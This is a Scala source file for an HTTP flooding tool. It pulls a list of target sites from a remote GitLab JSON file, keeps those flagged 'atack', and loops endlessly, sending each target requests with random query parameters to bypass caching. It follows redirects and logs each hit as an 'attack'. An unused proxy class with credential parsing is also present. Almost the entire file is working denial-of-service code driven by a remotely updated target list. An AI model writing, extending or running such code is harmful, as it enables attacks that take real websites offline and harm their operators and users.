package hi

import akka.actor.ActorSystem
import akka.http.scaladsl.Http
import akka.http.scaladsl.model._
import spray.json.DefaultJsonProtocol.jsonFormat3
import spray.json.{JsNumber, JsString, JsValue, RootJsonFormat}
import spray.json.DefaultJsonProtocol._
import spray.json._

import scala.concurrent.{ExecutionContextExecutor, Future}
import scala.util.Random

object Test {
  //val file = Source.fromFile("urls.txt").getLines.toList
  //val file = Source.fromURL("https://raw.githubusercontent.com/david-l-books/storage/main/urls.txt").getLines.toList
  val REFRESH_TIME = 10 * 60 * 1000

  var file = fetchTargets

  var lastUpdate = System.currentTimeMillis()

  def main(args: Array[String]): Unit = {
    implicit val system: ActorSystem = ActorSystem()
    implicit val executionContext: ExecutionContextExecutor = system.dispatcher

    if (System.currentTimeMillis() - lastUpdate > REFRESH_TIME) {
      file = fetchTargets
      println(s"list updated. size=${file.size}")
    }

    while (true) {
      file.foreach {
        url =>

          val str = randomQueryParam(url)

          Http().singleRequest(HttpRequest(uri = str)).map {
            case HttpResponse(StatusCodes.OK, _, _, _) =>
              println(s"attack $str")
            case HttpResponse(StatusCodes.Redirection(_), headers, _, _) =>
              println(s"attack with redirect -> $str")
              val link = headers.filter(ss => ss.name().equals("Location"))

              if (link.nonEmpty && link.head.value().startsWith("http") && link.head.value() != str) {
                Http().singleRequest(HttpRequest(uri = link.head.value())).map{
                  case HttpResponse(StatusCodes.OK, _, _, _) =>
                    println(s"attack with redirect $str")
                  case err =>
                    sys.error(s"attack with redirect failed $str")
                }
              }
            case err =>
              sys.error(s"server is not responding: $err")
          }
      }

      Thread.sleep(20)
    }
  }

  case class Proxy(id: Int, ip: String, auth: String) {
    def getIp: String = ip.replace("\r", "").split(":").head

    def port: String = ip.replace("\r", "").split(":")(1)

    def login: String = auth.split(":").head

    def password: String = auth.split(":")(1)
  }

  case class Target(id: Int, url: String, need_parse_url: Int, page: String, page_time: String, atack: Int)

  implicit val proxyFormat: RootJsonFormat[Proxy] = jsonFormat3(Proxy)

  implicit object TargetJsonFormat extends RootJsonFormat[Target] {
    override def read(json: JsValue): Target = {
      json.asJsObject.getFields("id", "url", "need_parse_url", "page", "page_time", "atack") match {
        case Seq(JsNumber(id), JsString(url), JsNumber(need_parse_url), JsString(page), page_time, JsNumber(atack)) =>
          Target(id.toInt, url, need_parse_url.toInt, page, page_time.toString(), atack.toInt)
      }
    }

    override def write(obj: Target): JsValue = ???
  }

  def fetchTargets: Seq[String] = {
    val source = scala.io.Source.fromURL("https://gitlab.com/cto.endel/atack_api/-/raw/master/sites.json")
    try {
      source.mkString.parseJson.convertTo[Seq[Target]].filter(_.atack > 0).map(_.url)
    } finally {
      source.close()
    }
  }

  def randomQueryParam(url: String) = {
    val queryParam = Random.alphanumeric.take(10).mkString + "=" + Random.alphanumeric.take(12).mkString
    if (url.contains("?")) url + "&" + queryParam else url + "?" + queryParam
  }
}
